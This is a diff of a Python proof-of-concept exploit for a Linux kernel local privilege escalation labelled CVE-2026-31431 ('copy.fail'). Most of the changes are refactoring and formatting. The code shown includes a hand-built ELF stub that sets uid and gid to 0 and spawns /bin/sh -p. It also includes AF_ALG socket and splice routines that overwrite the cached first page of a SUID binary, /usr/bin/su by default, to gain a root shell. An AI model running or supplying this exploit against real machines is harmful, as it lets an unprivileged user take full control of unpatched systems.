@@ -1,4 +1,5 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python
+
 """
 CVE-2026-31431 — "copy.fail" local privilege escalation PoC
 Affects: Linux kernel < 6.1.170 (Debian bookworm < 6.1.170-1)
@@ -28,18 +29,15 @@ References:
 """
 
 import argparse
+import contextlib
 import ctypes
 import ctypes.util
 import mmap
 import os
 import socket
 import struct
-import sys
-import time
 
-# ---------------------------------------------------------------------------
 # Linux constants not in the stdlib
-# ---------------------------------------------------------------------------
 AF_ALG = 38
 SOL_ALG = 279
 ALG_SET_KEY = 1
@@ -55,20 +53,9 @@ SPLICE_F_NONBLOCK = 2
 # Page size
 PAGE_SIZE = mmap.PAGESIZE
 
-# ---------------------------------------------------------------------------
-# Shellcode: x86-64 position-independent
-#   open("/tmp/sh", O_WRONLY|O_CREAT|O_TRUNC, 0755)
-#   write(fd, elf_stub, ...)   <- tiny /bin/sh exec wrapper
-#   chmod("/tmp/sh", 04755)
-#   exit(0)
-#
-# For the PoC we use a simpler approach: overwrite the first page of
-# the target binary with a stub ELF that execs /bin/sh as root.
-# The stub is architecture-specific (x86-64 only).
-# ---------------------------------------------------------------------------
-
 # Minimal ELF64 executable: setuid(0); setgid(0); execve("/bin/sh", ...)
 # Generated with: nasm + ld --oformat binary, stripped to 176 bytes.
+# fmt: off
 STUB_ELF = bytes([
     # ELF header (64 bytes)
     0x7f, 0x45, 0x4c, 0x46,  # magic
@@ -121,30 +108,16 @@ STUB_ELF = bytes([
     0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00,  # mov rax, 60
     0x48, 0xff, 0xc7,         # inc rdi
     0x0f, 0x05,               # syscall
-    # strings
-    b'/bin/sh\x00',
-    b'-p\x00',
-])
-
-# Flatten any nested bytes in STUB_ELF
-_flat = bytearray()
-for b in STUB_ELF:
-    if isinstance(b, int):
-        _flat.append(b)
-    else:
-        _flat.extend(b)
-STUB_ELF = bytes(_flat)
+]) + b'/bin/sh\x00' + b'-p\x00'
+# fmt: on
 
 # Pad to PAGE_SIZE so the splice covers a full page
 PAYLOAD = STUB_ELF + b'\x00' * (PAGE_SIZE - len(STUB_ELF))
 assert len(PAYLOAD) == PAGE_SIZE
 
 
-# ---------------------------------------------------------------------------
-# Helpers
-# ---------------------------------------------------------------------------
-
 libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
+
 
 def _check(ret, name="syscall"):
     if ret < 0:
@@ -156,13 +129,15 @@ def _check(ret, name="syscall"):
 def splice(fd_in, off_in, fd_out, off_out, length, flags):
     """Thin wrapper around the splice(2) syscall."""
     NR_splice = 275  # x86-64
-    ret = libc.syscall(NR_splice,
-                       ctypes.c_int(fd_in),
-                       ctypes.c_void_p(off_in),
-                       ctypes.c_int(fd_out),
-                       ctypes.c_void_p(off_out),
-                       ctypes.c_size_t(length),
-                       ctypes.c_uint(flags))
+    ret = libc.syscall(
+        NR_splice,
+        ctypes.c_int(fd_in),
+        ctypes.c_void_p(off_in),
+        ctypes.c_int(fd_out),
+        ctypes.c_void_p(off_out),
+        ctypes.c_size_t(length),
+        ctypes.c_uint(flags),
+    )
     return _check(ret, "splice")
 
 
@@ -170,19 +145,10 @@ def alg_socket(alg_type: bytes, alg_name: bytes, feat=0, mask=0):
     """Create and bind an AF_ALG socket."""
     sock = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
     # struct sockaddr_alg: sa_family(2) + type(14) + feat(4) + mask(4) + name(64)
-    sa = struct.pack("H14sII64s",
-                     AF_ALG,
-                     alg_type.ljust(14, b'\x00'),
-                     feat,
-                     mask,
-                     alg_name.ljust(64, b'\x00'))
+    sa = struct.pack("H14sII64s", AF_ALG, alg_type.ljust(14, b'\x00'), feat, mask, alg_name.ljust(64, b'\x00'))
     sock.bind(sa)
     return sock
 
-
-# ---------------------------------------------------------------------------
-# Exploit
-# ---------------------------------------------------------------------------
 
 def exploit(target: str, payload: bytes) -> None:
     print(f"[*] target  : {target}")
@@ -223,10 +189,8 @@ def exploit(target: str, payload: bytes) -> None:
     cmsg_data = struct.pack("II", ALG_OP_ENCRYPT, 0) + struct.pack("II", 2, len(iv)) + iv
     # We send the pipe read end as the data source via sendmsg
     # (simplified: write directly to child_fd)
-    try:
+    with contextlib.suppress(OSError):
         os.write(child_fd, payload)
-    except OSError:
-        pass  # EBADMSG expected — the point is the page cache write
 
     # 6. splice pipe -> /dev/null to trigger the in-place page cache write
     devnull = os.open("/dev/null", os.O_WRONLY)
@@ -265,8 +229,7 @@ def exploit(target: str, payload: bytes) -> None:
 
 def main():
     parser = argparse.ArgumentParser(description="CVE-2026-31431 copy.fail PoC")
-    parser.add_argument("--target", default="/usr/bin/su",
-                        help="SUID binary to overwrite (default: /usr/bin/su)")
+    parser.add_argument("--target", default="/usr/bin/su", help="SUID binary to overwrite (default: /usr/bin/su)")
     args = parser.parse_args()
 
     if os.geteuid() == 0:
